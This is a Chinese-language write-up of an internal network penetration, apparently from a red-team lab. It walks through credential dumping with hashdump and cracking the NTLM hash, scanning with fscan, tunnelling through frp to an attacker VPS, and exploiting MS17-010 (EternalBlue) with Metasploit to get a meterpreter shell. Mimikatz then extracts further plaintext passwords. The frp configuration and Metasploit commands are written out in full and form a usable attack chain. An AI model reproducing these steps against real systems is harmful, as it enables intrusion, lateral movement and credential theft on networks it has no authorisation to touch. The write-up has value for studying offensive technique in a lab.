### 内网渗透

#### **信息搜集**

通过执行命令ipconfig /all发现存在双网卡

![](../Images/447992bfa6bd1dad45f7c72a11e12ab0.png)

#### **密码凭据抓取**

通过hashdump抓取密码Administrator ccef208c6485269c20db2cad21734fe7

![](../Images/a9bcc30a7f497b936bba4277ea2efc37.png)

ntlm hash值为`ccef208c6485269c20db2cad21734fe7`，通过cmd5解出明文密码`Admin12345`

![](../Images/56f71592178c8defc4c929c8ef78d030.png)

#### **横向移动**

有了明文密码我们可以进行远程登陆，但真实环境中不到万不得已一般不建议执行此操作，因此寻找其他的方法进行内网横向移动

通过上传fscan扫描10网段，发现存在ms17-010漏洞的10.10.20.7主机

![](../Images/c6b428a12fca4cbf345cf1763dd1f670.png)

一开始打算通过Eternalblue直接上线cs，发现不成功，改用其他方法

项目地址：https://github.com/0xFenrik/Eternalblue

![](../Images/85c250c7883eaf6bd9f065e202361bfa.png)

#### **隧道搭建**

上传frp搭建隧道代理

*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   

```
[common]#frpc配置server_addr = VPS地址server_port = 7000[plugin_socks]type = tcpremote_port = 1080plugin = socks5
[common]#frps配置bind_addr =0.0.0.0bind_port = 7000
```

#### **永恒之蓝ms17-010**

改用metaspolit，调用永恒之蓝模块进行攻击，成功获取shell

*   
*   
*   
*   
*   
*   

```
msf6 > setg Proxies socks5:frps服务端IP:监听端口msf6 > setg ReverseAllowProxy truemsf6 > use exploit/windows/smb/ms17_010_eternalbluemsf6 > set payload windows/x64/meterpreter/bind_tcpmsf6 > set rhost 10.10.20.7msf6 > run
```

或者`vi /etc/proxychains.conf`修改配置文件`socks5 127.0.0.1 1080`

![](../Images/4af734bd54d74321e7a81f51f3915cb0.png)

然后通过`proxychains msfconsole`启动

![](../Images/3b0e3651397b21106e5f0074270e885b.png)

成功后通过mimikatz执行creds\_all获取账户密码redteam\\saul:admin!@#45

![](../Images/73a6623af0fd7f738b1c6fb5bd163366.png)
